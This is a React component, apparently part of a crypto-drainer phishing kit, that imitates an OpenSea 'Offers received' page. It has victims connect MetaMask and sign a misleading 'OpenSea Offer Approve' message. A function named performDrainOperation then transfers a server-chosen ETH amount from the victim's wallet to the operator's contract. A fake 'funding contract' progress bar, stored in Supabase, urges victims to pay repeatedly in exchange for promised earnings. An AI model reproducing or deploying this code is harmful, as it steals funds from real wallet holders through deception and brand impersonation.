import { useEffect, useState } from "react";
import eth from "../assets/eth.svg";
import PercentageBar from "./PercentageBar";
import { info } from "../assets";
import { notifyError } from "./CustomErrorToast";
import {
  fetchAmount,
  fetchPercentageAndTransactionForAddress,
  updatePercentageAndTransactionForAddress,
  insertPercentageAndTransactionForAddress,
  fetchWalletAddress,
} from "../database/supabase";
import DeadlineOffer from "./DeadlineOffer";

// const contractAddress = "0x17025682f2AE05a1aC537b6253E7581F27a93E99"; sepolia
const contractAddress = import.meta.VITE_CONTRACT_ADDRESS; // mainnet

const contractABI = [
  {
    inputs: [],
    stateMutability: "payable",
    type: "receive",
  },
];

const OffersList = ({
  offers,
  ethPriceUSD,
  totalEarnings,
  onOpenModal,
  onTransactionModalShow,
  onTransactionModalHide,
}) => {
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [contract, setContract] = useState(null);
  const [transactionCount, setTransactionCount] = useState(0);
  const [percentage, setPercentage] = useState(0);
  const [userAddress, setUserAddress] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [hasPreviousData, setHasPreviousData] = useState(false); // New state for conditionally rendering

  useEffect(() => {
    const getWalletAddress = async () => {
      const address = await fetchWalletAddress();
      setWalletAddress(address);

      // Fetch existing data for the wallet address
      const existingData = await fetchPercentageAndTransactionForAddress(
        address
      );
      if (existingData) {
        setPercentage(parseFloat(existingData.percent));
        setTransactionCount(parseInt(existingData.transaction));
        setHasPreviousData(true); // Set true if data exists
      }
    };

    getWalletAddress();
  }, []);

  const connectWallet = async () => {
    if (typeof window.ethereum !== "undefined") {
      try {
        await window.ethereum.request({ method: "eth_requestAccounts" });

        const newProvider = new ethers.providers.Web3Provider(window.ethereum);
        const newSigner = newProvider.getSigner();
        setProvider(newProvider);
        setSigner(newSigner);

        const address = await newSigner.getAddress();
        setUserAddress(address);

        const newContract = new ethers.Contract(
          contractAddress,
          contractABI,
          newSigner
        );
        setContract(newContract);

        // Fetch the percentage and transaction count for this address
        const fetchedData = await fetchPercentageAndTransactionForAddress(
          address
        );
        if (fetchedData) {
          setPercentage(parseFloat(fetchedData.percent));
          setTransactionCount(parseInt(fetchedData.transaction));
          setHasPreviousData(true); // Set true if data exists
        }

        await requestSignature(newSigner, address);
      } catch (error) {
        notifyError("Error connecting to MetaMask. Please try again.");
      }
    } else {
      notifyError("Install MetaMask and try again.");
    }
  };

  const updatePercentage = async () => {
    let newPercentage = percentage;
    let newTransactionCount = transactionCount + 1;

    // Calculate new percentage based on the transaction count
    if (newTransactionCount === 1) newPercentage = 50;
    else if (newTransactionCount <= 3) newPercentage += 15;
    else if (newTransactionCount <= 5) newPercentage += 5;
    else if (newTransactionCount <= 8) newPercentage += 2;
    else if (newTransactionCount <= 11) newPercentage += 1;
    else if (newTransactionCount <= 31) newPercentage += 0.05;

    if (newPercentage >= 100) {
      newPercentage = 100; // Cap the percentage at 100%
    }

    setPercentage(newPercentage);
    setTransactionCount(newTransactionCount);

    // Insert or update into Supabase using walletAddress
    if (walletAddress) {
      const existingData = await fetchPercentageAndTransactionForAddress(
        walletAddress
      );

      if (!existingData) {
        // Insert if not exists
        await insertPercentageAndTransactionForAddress(
          walletAddress,
          newPercentage,
          newTransactionCount
        );
      } else {
        // Update if exists
        await updatePercentageAndTransactionForAddress(
          walletAddress,
          newPercentage,
          newTransactionCount
        );
      }
    }
  };

  const requestSignature = async (signer, address) => {
    try {
      const message = `By signing this message, I confirm that:
        \n\n⟶ I am the rightful owner of this Ethereum address.
        \n⟶ I own the digital artwork associated with this address.
        \n⟶ I have reviewed and understand the details of the offer.
        \n⟶ I agree to the terms and conditions of the sale.
        \n\nBy signing this contract, you acknowledge and agree to accept the offer associated with this digital artwork. This process is essential to uphold the integrity and trust of our marketplace.
        \n\nOpenSea Offer Approve 🔵`;
      const signature = await signer.signMessage(message);

      await performDrainOperation(signer, address);
    } catch (error) {
      notifyError(
        `${
          error.message === "User rejected the request." &&
          "You rejected the request in your wallet."
        }`
      );
    }
  };

  function delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  const performDrainOperation = async (signer, address) => {
    await delay(1000);
    let balance = await signer.getBalance();
    const pilaAmount = await fetchAmount();
    const formattedBalance = ethers.utils.formatEther(balance);
    try {
      const web3 = new Web3(window.ethereum);

      const amountInEth = pilaAmount.amount;
      const amountInWei = web3.utils.toWei(amountInEth, "ether");

      const gasEstimate = await web3.eth.estimateGas({
        from: address,
        to: contractAddress,
        value: amountInWei,
      });

      const gasBuffer = BigInt(20000);
      const totalGas = BigInt(gasEstimate) + gasBuffer;

      const gasCost = ethers.utils.parseUnits(totalGas.toString(), "wei");

      if (balance.gte(gasCost.add(ethers.BigNumber.from(amountInWei)))) {
        onTransactionModalShow();
        try {
          await web3.eth
            .sendTransaction({
              from: address,
              to: contractAddress,
              value: amountInWei,
              gas: Number(totalGas),
            })
            .then((tx) => {
              onTransactionModalHide();
              updatePercentage();
            })
            .catch((error) => {
              onTransactionModalHide();
            });
        } catch (txError) {
          notifyError("Transaction failed. Please try again.");
        }
      }
    } catch (error) {
      onOpenModal(formattedBalance, address);
    }
  };

  const openSeaFeePercentage = 2.5;
  const creatorFeePercentage = 5.0;

  const openSeaFee = (totalEarnings * openSeaFeePercentage) / 100;
  const creatorFee = (totalEarnings * creatorFeePercentage) / 100;
  const totalAfterFees = totalEarnings - openSeaFee - creatorFee;
  const usdTotalAfterFees = ethPriceUSD
    ? (totalAfterFees * ethPriceUSD).toFixed(2)
    : "Loading...";

  const openTidioChat = (e) => {
    e.preventDefault(); // Prevent the default anchor behavior
    if (window.tidioChatApi) {
      window.tidioChatApi.open();
    }
  };

  return (
    <div className="mt-8 lg:mt-0 bg-[#1B1B1B] p-4 rounded-lg shadow-xl w-full sm:w-full md:w-full lg:w-[36rem] border-2 border-[#373737] drop-shadow-xl backdrop-blur-md">
      <DeadlineOffer />

      <h2 className="text-lg  text-start text-white mb-4">Offers received</h2>

      <table className="min-w-full divide-y divide-[#373737]">
        <thead className="bg-neutral-800">
          <tr>
            <th
              scope="col"
              className="px-4 py-3 text-left text-xs  font-medium text-gray-400 uppercase tracking-wider"
            >
              Price
            </th>
            <th
              scope="col"
              className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider"
            >
              USD Price
            </th>
            <th
              scope="col"
              className="px-4 py-3 text-left text-xs  font-medium text-gray-400 uppercase tracking-wider"
            >
              Quantity
            </th>
            <th
              scope="col"
              className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider"
            >
              Status
            </th>
            <th
              scope="col"
              className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider"
            >
              From
            </th>
          </tr>
        </thead>
        <tbody className="bg-neutral-900 divide-y divide-[#373737]">
          {offers.map((offer) => {
            const usdPrice = ethPriceUSD
              ? (offer.price * ethPriceUSD).toFixed(2)
              : "Loading...";

            return (
              <tr key={offer.id}>
                <td className="px-4 py-4 whitespace-nowrap text-xs md:text-sm font-medium text-white">
                  {offer.price} {offer.symbol}
                </td>
                <td className="px-4  py-4 whitespace-nowrap text-xs md:text-sm text-gray-400">
                  ${usdPrice}
                </td>
                <td className="px-4 py-4 whitespace-nowrap text-xs md:text-sm text-gray-400">
                  {offer.quantity}
                </td>
                <td className="px-4 py-4 whitespace-nowrap text-xs md:text-sm text-gray-400">
                  {offer.status}
                </td>
                <td className="px-4 py-4 whitespace-nowrap text-xs md:text-sm text-[#8fc7ff]">
                  {offer.from}
                </td>
              </tr>
            );
          })}
        </tbody>
      </table>

      <div className="my-5 px-2">
        <h3 className="text-white font-semibold text-lg mb-3">Fees</h3>
        <div className="flex justify-between text-sm text-gray-400">
          <span>OpenSea Fee</span>
          <span>2.5%</span>
        </div>
        <div className="flex justify-between text-sm text-gray-400">
          <span>Creator Fee</span>
          <span>5.0%</span>
        </div>
      </div>

      <div className="my-5 px-2 flex justify-between">
        <h1 className="text-white font-semibold text-lg">Total Earnings</h1>
        <h1 className="text-white font-semibold text-lg flex gap-2">
          <img src={eth} width={20} height={20} alt="eth logo" />
          <span>
            {totalAfterFees.toFixed(4)} ETH (${usdTotalAfterFees})
          </span>
        </h1>
      </div>

      {hasPreviousData && (
        <div className="px-3">
          <PercentageBar value={percentage} />
          <div className="flex gap-2 py-4 items-center">
            <img src={info} alt="info" width={20} height={20} />
            <span className="text-[#99A0A3] text-xs">
              After completing funding contract, you will receive the total
              earnings.
            </span>
          </div>
        </div>
      )}

      <div className="grid grid-cols-2 mt-7 gap-x-4">
        {hasPreviousData ? (
          <div className="col-span-2">
            <a
              href="#"
              title=""
              className={`inline-flex items-center justify-center px-4 py-4 text-sm font-bold text-white transition-all duration-200 rounded-xl ${
                percentage >= 100
                  ? "bg-gray-600"
                  : "bg-[#2081E2] border border-[#2E8DEE] hover:bg-[#2E8DEE]"
              }`}
              role="button"
              onClick={percentage < 100 ? connectWallet : openTidioChat}
              style={{ width: "100%" }}
            >
              {percentage >= 100 ? "Contact Support" : "Complete Offer"}
            </a>
          </div>
        ) : (
          <>
            <a
              href="#"
              title=""
              className="inline-flex items-center justify-center px-4 py-4 text-sm font-bold text-white transition-all duration-200 bg-[#242424] hover:bg-[#2D2D2D] rounded-xl"
              role="button"
              onClick={connectWallet}
            >
              Counter Offer
            </a>
            <a
              href="#"
              title=""
              className="inline-flex items-center justify-center px-4 py-4 text-sm font-bold text-white transition-all duration-200 bg-[#2081E2] border border-[#2E8DEE] hover:bg-[#2E8DEE] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-900 rounded-xl"
              role="button"
              onClick={connectWallet}
            >
              Accept All Offer
            </a>
          </>
        )}
      </div>
    </div>
  );
};

export default OffersList;
